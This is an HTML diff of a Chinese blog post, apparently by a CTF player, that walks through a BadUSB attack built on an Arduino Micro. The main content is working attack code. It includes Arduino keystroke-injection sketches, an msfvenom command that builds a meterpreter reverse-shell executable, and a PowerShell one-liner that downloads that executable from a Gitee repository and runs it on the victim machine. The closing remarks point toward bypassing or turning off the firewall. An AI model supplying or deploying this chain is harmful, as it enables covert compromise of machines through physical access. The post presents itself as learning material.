@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8" />
+<title>
+    blog
+</title>
+<!--[if lt IE 9]><script src="//cdn.bootcss.com/html5shiv/r29/html5.js"></script><![endif]-->
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+<meta http-equiv="x-dns-prefetch-control" content="on">
+<link rel="dns-prefetch" href="https://cdn.jsdelivr.net">
+<meta name="author" content="ticker tape timer">
+<meta name="description" content="A CTFer loves RE and Misc">
+<meta name="keywords" content="">
+<script async src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+<link rel="stylesheet" href="https://tickertapetimer.github.io/styles/main.css" />
+<link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+<script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/1.7.1/jquery.min.js"></script>
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/css/style.min.css" />
+    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/tocbot.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/script.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/icon.min.js"></script>
+    
+            <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@1.0.12/CDN/js/Card/prism.min.js"></script>
+            <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@1.0.12/CDN/css/Card/prism.min.css" />
+            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.css">
+            <script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.js"></script>
+            
+                            <script>
+                                (function() {
+                                    var bp = document.createElement('script');
+                                    var curProtocol = window.location.protocol.split(':')[0];
+                                    if (curProtocol === 'https') {
+                                        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+                                    } else {
+                                        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+                                    }
+                                    var s = document.getElementsByTagName("script")[0];
+                                    s.parentNode.insertBefore(bp, s);
+                                })();
+                            </script>
+                            
+</head>
+
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo">
+                <a href="https://tickertapetimer.github.io">
+                    blog
+                </a>
+            </div>
+
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/">
+                        首页
+                    </a>
+                    
+                    <a class="menu-item" href="/archives">
+                        归档
+                    </a>
+                    
+                    <a class="menu-item" href="/tags">
+                        标签
+                    </a>
+                    
+                    <a class="menu-item" href="/me">
+                        关于
+                    </a>
+                    
+                        <input id="switch_default" type="checkbox" class="switch_default">
+                        <label for="switch_default" class="toggleBtn"></label>
+            </div>
+            <form id="gridea-search-form" data-update="1629443424144" action="/search/index.html">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
+            </form>
+        </div>
+    </nav>
+
+    
+        <nav class="navbar-mobile" id="nav-mobile">
+            <div class="container">
+                <div class="navbar-header">
+                    <div>
+                        <a href="https://tickertapetimer.github.io">
+                            blog
+                        </a>
+                        <!--en-->
+                        <a id="mobile-toggle-theme-en" class="a en">&nbsp;Dark</a>
+                        <!--zh-->
+                        <a id="mobile-toggle-theme-zh" class="a zh">&nbsp;&#x6697;&#x9ED1;</a>
+                    </div>
+                    <form id="gridea-search-form" data-update="1629443424144" action="/search/index.html">
+                        <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
+                    </form>
+                    <!--en-->
+                    <div class="menu-toggle" id="menu-toggle-en" onclick="mobileBtn()">&#9776; Menu</div>
+                    <!--zh-->
+                    <div class="menu-toggle" id="menu-toggle-zh" onclick="mobileBtn()">&#9776; &#x83DC;&#x5355;</div>
+
+                </div>
+                <div class="menu" id="mobile-menu">
+                    
+                        <a class="menu-item" href="/">
+                            首页
+                        </a>
+                        
+                        <a class="menu-item" href="/archives">
+                            归档
+                        </a>
+                        
+                        <a class="menu-item" href="/tags">
+                            标签
+                        </a>
+                        
+                        <a class="menu-item" href="/me">
+                            关于
+                        </a>
+                        
+                </div>
+            </div>
+        </nav>
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementById("menu-toggle-en");
+        var toggleMenu_zh = document.getElementById("menu-toggle-zh");
+
+        var mobileMenu = document.getElementById("mobile-menu");
+        if (toggleMenu.display != "none") {
+            if (toggleMenu.classList.contains("active")) {
+                toggleMenu.classList.remove("active")
+                mobileMenu.classList.remove("active")
+            } else {
+                toggleMenu.classList.add("active")
+                mobileMenu.classList.add("active")
+            }
+        } else if (toggleMenu_zh.display != "none") {
+            if (toggleMenu_zh.classList.contains("active")) {
+                toggleMenu_zh.classList.remove("active")
+                mobileMenu.classList.remove("active")
+            } else {
+                toggleMenu_zh.classList.add("active")
+                mobileMenu.classList.add("active")
+            }
+        }
+
+    }
+</script>
+            <div class="main">
+                <div class="container">
+                    <article class="post-wrap">
+                        <header class="post-header">
+                            <h1 class="post-title">
+                                基于badusb实现的基础渗透
+                            </h1>
+                            
+                                <!--en-->
+                                <div class="post-meta en">
+                                    Author:
+                                    <a itemprop="author" rel="author" href="/">
+                                        blog
+                                    </a>
+                                    <span class="post-time">
+                                Date: <a href="#">2020-08-08</a>
+                            </span>
+                                    <span class="post-readtime">Reading Time:<a
+                                    href="#">4.8
+                                    mins</a></span>
+                                    <span class="post-words">words:<a href="#">1227</a></span>
+                                    
+                                        <span class="post-category">
+                                Category:
+                                
+                                <a href="https://tickertapetimer.github.io/tag/OI2yF9Mjr/">学习</a>
+                                
+                                <a href="https://tickertapetimer.github.io/tag/AFFv1xmrf/">实战</a>
+                                
+                            </span>
+                                        
+                                </div>
+                                
+                        </header>
+                        
+                        <div class="post-content">
+                            <h2 id="badusb基础">badusb基础</h2>
+<h3 id="初识badusb">初识badusb</h3>
+<p>BadUSB攻击是一种利用USB固件中的固有漏洞的攻击，将一个写入了恶意代码的定制USB设备，例如U盘，插入受害者电脑，它会伪装成HID设备（Human InterfaceDevice，是计算机直接与人交互的设备，例如键盘、鼠标等）进行操作。它由Karsten Nohl 和 Jakob Lell 在2014年BlackHat大会上提出，特点是恶意代码存在于U盘的固件中，杀毒软件无法访问固件区域，也就没有办法查杀这些恶意代码。应对这一攻击最有效的方法就是不要随意插入未知、不受信任的USB设备。</p>
+<p>在讲解BadUSB的原理之前要先介绍一下Rubber Ducky 和Teensy,这两种攻击也是利用HID进行攻击，将设备模拟成键盘进行按键操作，但这两个设备的缺点在于需要定制硬件设备，而BadUSB的优点就是它可以使用通用的USB设备来达成攻击。</p>
+<p>但值得注意的是，不是所有USB设备都能制作BadUSB。由于需要将恶意代码写入到固件中，我们需要编写固件并烧录到设备中。想要编写固件也就需要掌握USB设备中的芯片的指令规范，然而开发文档只有部分芯片的是开放的，所以实际上能够制作BadUSB的设备有一定的条件。</p>
+<h3 id="badusb制作">badusb制作</h3>
+<p>本次实验使用的开发板是Arduino/Genuino Micro，该开发板的指令与Arduino Leonardo兼容，所以只要使用Arduino Leonardo的指令去编写代码即可</p>
+<figure data-type="image" tabindex="1"><img src="https://tickertapetimer.github.io/post-images/%E5%9F%BA%E4%BA%8Ebadusb%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%9F%BA%E7%A1%80%E6%B8%97%E9%80%8F/image-20200808095934732.png" alt="image-20200808095934732" loading="lazy"></figure>
+<p>先下载编写程序的开发软件，网址<a href="https://www.arduino.cc/en/Main/Software">https://www.arduino.cc/en/Main/Software</a> ，下载完成后打开，选择相应的开发板和端口和编程器</p>
+<figure data-type="image" tabindex="2"><img src="https://tickertapetimer.github.io/post-images/%E5%9F%BA%E4%BA%8Ebadusb%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%9F%BA%E7%A1%80%E6%B8%97%E9%80%8F/image-20200808100019010.png" alt="image-20200808100019010" loading="lazy"></figure>
+<p>然后开始编写代码，先编写相对简单的代码</p>
+<pre><code class="language-c++">#include&lt;Keyboard.h&gt; //包含键盘模块头文件
+
+void setup(){ //初始化
+
+  Keyboard.begin();//开始键盘通信
+
+  delay(1000);//延时1000毫秒，不要太短，因为每天电脑的运行速度都不一样 
+
+  Keyboard.press(KEY_CAPS_LOCK); //按下大写键 这里我们最好这样写 不然大多数电脑在中文输入的情况下就会出现问题
+
+  Keyboard.release(KEY_CAPS_LOCK); //释放大写键
+
+  delay(500);
+
+  Keyboard.press(KEY_LEFT_GUI);//按下徽标键 也就是win键 
+
+  delay(500); 
+
+  Keyboard.press('r');//按下r键 
+
+  delay(500); 
+
+  Keyboard.release(KEY_LEFT_GUI);//松掉win键 
+
+  Keyboard.release('r');//松掉r键 
+
+  delay(500); 
+
+  Keyboard.println(&quot;CMD&quot;);//输入shell命令
+
+  delay(500); 
+
+  Keyboard.press(KEY_RETURN);  //按下回车键
+
+  Keyboard.release(KEY_RETURN); //释放回车键
+
+  delay(500); 
+
+  Keyboard.press(KEY_CAPS_LOCK); //按下大写键
+
+  Keyboard.release(KEY_CAPS_LOCK); //释放大写键 我们再次关闭开启的大写键
+
+  delay(500);
+
+  Keyboard.end();//结束键盘通讯 
+
+} 
+void loop()
+{
+}
+</code></pre>
+<p>编译上传，成功后看到badusb自动运行程序，打开了cmd，badusb制作成功<img src="https://tickertapetimer.github.io/post-images/%E5%9F%BA%E4%BA%8Ebadusb%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%9F%BA%E7%A1%80%E6%B8%97%E9%80%8F/image-20200808100500058.png" alt="image-20200808100500058" loading="lazy"></p>
+<h2 id="渗透">渗透</h2>
+<h3 id="后门程序制作">后门程序制作</h3>
+<p>打开kali，用MSF制作后门脚本</p>
+<p>输入：<code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=182.168.248.131 LPORT=6666 -f exe &gt; shell.exe</code></p>
+<p>LHOST为kali的IP，LPORT为端口</p>
+<figure data-type="image" tabindex="3"><img src="https://tickertapetimer.github.io/post-images/%E5%9F%BA%E4%BA%8Ebadusb%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%9F%BA%E7%A1%80%E6%B8%97%E9%80%8F/image-20200808100706138.png" alt="image-20200808100706138" loading="lazy"></figure>
+<p>制作好后，将它上传服务器，但是由于我懒得，所以我选择将其上传至码云仓库，效果一样，后门做好后，开始给badusb编写相应的程序</p>
+<h3 id="编写代码">编写代码</h3>
+<pre><code class="language-c++">#include&lt;Keyboard.h&gt; //包含键盘模块头文件
+
+void setup(){ //初始化
+
+  Keyboard.begin();//开始键盘通信
+
+  delay(1000);//延时1000毫秒，不要太短，因为每天电脑的运行速度都不一样 
+
+  Keyboard.press(KEY_CAPS_LOCK); //按下大写键 这里我们最好这样写 不然大多数电脑在中文输入的情况下就会出现问题
+
+  Keyboard.release(KEY_CAPS_LOCK); //释放大写键
+
+  delay(500);
+
+  Keyboard.press(KEY_LEFT_GUI);//按下徽标键 也就是win键 
+
+  delay(500); 
+
+  Keyboard.press('r');//按下r键 
+
+  delay(500); 
+
+  Keyboard.release(KEY_LEFT_GUI);//松掉win键 
+
+  Keyboard.release('r');//松掉r键 
+
+  delay(500); 
+
+  Keyboard.println(&quot;POWERSHELL -cOMMAND $CLNT = NEW-OBJECT sYSTEM.nET.wEBcLIENT;$URL = 'HTTPS://GITEE.COM/DDJSQ2333/SHELL/RAW/MASTER/SHELL1.EXE';$FILE = 'd:\\SHELL2.EXE';$CLNT.dOWNLOADfILE($URL,$FILE);d:\\SHELL2.EXE;&quot;);//输入shell命令
+
+  delay(500); 
+
+  Keyboard.press(KEY_RETURN);  //按下回车键
+
+  Keyboard.release(KEY_RETURN); //释放回车键
+
+  delay(500); 
+
+  Keyboard.press(KEY_CAPS_LOCK); //按下大写键
+
+  Keyboard.release(KEY_CAPS_LOCK); //释放大写键 我们再次关闭开启的大写键
+
+  delay(500);
+
+  Keyboard.end();//结束键盘通讯 
+
+} 
+void loop(){
+}
+
+</code></pre>
+<p>其实就是改了输入的shell命令，用cmd下载东西，主要通过下列代码下载</p>
+<pre><code>$clnt = new-object System.Net.WebClient;
+$url = 'https://gitee.com/ddjsq2333/shell/raw/master/shell1.exe';
+$file = 'D:\\shell2.exe';
+$clnt.DownloadFile($url,$file);
+D:\\shell2.exe
+</code></pre>
+<h3 id="开启渗透">开启渗透</h3>
+<figure data-type="image" tabindex="4"><img src="https://tickertapetimer.github.io/post-images/%E5%9F%BA%E4%BA%8Ebadusb%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%9F%BA%E7%A1%80%E6%B8%97%E9%80%8F/image-20200808101925145.png" alt="image-20200808101925145" loading="lazy"></figure>
+<p>在目标机插入该badsub，发现kali接收到弹到的shell了，文件管理器中也出现的后门程序</p>
+<figure data-type="image" tabindex="5"><img src="https://tickertapetimer.github.io/post-images/%E5%9F%BA%E4%BA%8Ebadusb%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%9F%BA%E7%A1%80%E6%B8%97%E9%80%8F/image-20200808102224449.png" alt="image-20200808102224449" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://tickertapetimer.github.io/post-images/%E5%9F%BA%E4%BA%8Ebadusb%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%9F%BA%E7%A1%80%E6%B8%97%E9%80%8F/image-20200808102145162.png" alt="image-20200808102145162" loading="lazy"></figure>
+<p>渗透成功，get shell了</p>
+<h2 id="总结">总结</h2>
+<p>badusb虽然无法被防火墙识别到，但是它从码云仓库下载下来的后门软件会被防火墙检测到，所以要成功，要么先关闭防火墙，要么想办法绕过或者关闭防火墙，后面的操作还在研究</p>
+
+                        </div>
+                        
+                            <div class="post-toc">
+                                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#badusb%E5%9F%BA%E7%A1%80">badusb基础</a>
+<ul>
+<li><a href="#%E5%88%9D%E8%AF%86badusb">初识badusb</a></li>
+<li><a href="#badusb%E5%88%B6%E4%BD%9C">badusb制作</a></li>
+</ul>
+</li>
+<li><a href="#%E6%B8%97%E9%80%8F">渗透</a>
+<ul>
+<li><a href="#%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F%E5%88%B6%E4%BD%9C">后门程序制作</a></li>
+<li><a href="#%E7%BC%96%E5%86%99%E4%BB%A3%E7%A0%81">编写代码</a></li>
+<li><a href="#%E5%BC%80%E5%90%AF%E6%B8%97%E9%80%8F">开启渗透</a></li>
+</ul>
+</li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+</li>
+</ul>
+
+                            </div>
+                            
+                                
+                                    
+                                        <!--en-->
+                                        <section class="post-copyright en">
+                                            <p class="copyright-item">
+                                                <span>Author:</span>
+                                                <span>blog</span>
+                                            </p>
+
+                                            <p class="copyright-item">
+                                                <span>Permalink:</span>
+                                                <span><a href="https://tickertapetimer.github.io/基于badusb实现的基础渗透/">https://tickertapetimer.github.io/基于badusb实现的基础渗透/</a></span>
+                                            </p>
+
+                                            <p class="copyright-item">
+                                                <span>License:</span>
+                                                <span>MIT License</span>
+                                            </p>
+                                        </section>
+                                        
+                                                
+                                                    
+                                                        <!-- Share-->
+                                                        <span style="margin-right:15px">
+                                                    <i class="post-share"></i>
+                                                    <span>Share:</span>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://tickertapetimer.github.io/基于badusb实现的基础渗透/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://tickertapetimer.github.io/基于badusb实现的基础渗透/&sharesource=qzone&title=基于badusb实现的基础渗透&pics=https://tickertapetimer.github.io/images/avatar.png?v=1629443424144&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://tickertapetimer.github.io/基于badusb实现的基础渗透/&sharesource=weibo&title=基于badusb实现的基础渗透 + " - " + &pic="https://tickertapetimer.github.io/images/avatar.png?v=1629443424144 "><i class="fa fa-weibo "></i></a>
+                                                        
+                                                                </span>
+                                                                <!--en-->
+                                                                <section class="post-tags en ">
+                                                                    <div>
+                                                                        <span>Tag(s):</span>
+                                                                        <span class="tag ">
+                        
+                        
+                        <a href="https://tickertapetimer.github.io/tag/OI2yF9Mjr/">#
+                                                学习
+                                                    </a>
+                                                    
+                        <a href="https://tickertapetimer.github.io/tag/AFFv1xmrf/">#
+                                                实战
+                                                    </a>
+                                                    
+                                                        
+                                                            </span>
+                                                                    </div>
+                                                                    <div>
+                                                                        <a href="javascript:window.history.back();">back</a>
+                                                                        <span>&dot;</span>
+                                                                        <a href="#">home</a>
+                                                                    </div>
+                                                                </section>
+                                                                
+                                                                                <!---->
+                                                                                <section class="post-nav">
+                                                                                    
+                                                                                        <a class="prev" rel="prev" href="https://tickertapetimer.github.io/分析网易云加密/">
+                                                                                            分析网易云加密
+                                                                                        </a>
+                                                                                        
+                                                                                            
+                                                                                                <a class="next" rel="next" href="https://tickertapetimer.github.io/辩论队一面辩题资料/">
+                                                                                                     辩论队一面辩题资料
+                                                                                                </a>
+                                                                                                
+                                                                                </section>
+                    </article>
+                </div>
+                
+                                            
+            </div>
+    </div>
+    </div>
+    </div>
+    
+        <footer id="footer" class="footer">
+            <div class="copyright">
+                
+                        
+                            
+                                        <svg viewBox="0 0 1024 1024" style="margin-left: 5px;margin-right: 5px;" version="1.0" width="8" height="8" class="my-face">
+            <path
+                d="M863.597631 513.574282l-271.33965-140.213484L729.783667 81.926656c3.583731-7.87141 7.167462-15.742819 7.167462-25.214109C736.887134 25.226908 708.345275 0.012799 672.635953 0.012799a63.611229 63.611229 0 0 0-39.293053 12.607055c-1.791866 1.59988-3.519736 3.19976-5.311602 3.19976L147.87531 418.925381a55.547834 55.547834 0 0 0-19.646527 47.356448c1.791866 17.278704 14.27093 33.021523 32.125591 42.492813l271.33965 141.749369L292.504463 945.221908c-12.479064 25.214109-1.791866 53.563983 23.166262 69.306802 10.751194 6.335525 23.230258 9.47129 35.709322 9.47129 16.062795 0 32.125591-4.735645 44.604655-15.742819l480.091993-403.297753a55.547834 55.547834 0 0 0 19.646526-47.228458 61.243407 61.243407 0 0 0-32.12559-44.156688z"
+                fill="#93b5cf"></path>
+        </svg>
+                                        blog &copy;Copyright
+                                            <script>
+                                                var date = new Date();
+                                                document.write("" + date.getFullYear());
+                                            </script>
+                                            | Powered by
+                                            <a href="https://coding.net" target="_blank">
+                                                Coding.net
+                                            </a>
+            </div>
+            <div id="update" style="display:none;">
+                on
+            </div>
+            
+                <div id="version" style="display:none;">
+                    1.7.5
+                </div>
+                
+                    <script>
+                        var pat = '';
+                        
+                        document.write('<div id="home_path" style="display:none;">' + document.location.protocol + '//' + window.document.location.hostname + pat + '</div>')
+                    </script>
+        </footer>
+        
+                <script>
+                    
+                    
+                    
+                    getStar();
+                    hljs.initHighlighting();
+                    console.clear();
+                    
+                    CheckVersion();
+                    
+                    var newDate = new Date();
+                    newDate.setTime(1629443424144);
+                    console.log(" Blog Update Time: " + newDate.toLocaleDateString());
+                    console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
+                </script>
+                
+        </div>
+</body>
+<script>
+    scroll();
+</script>
+
+</html>
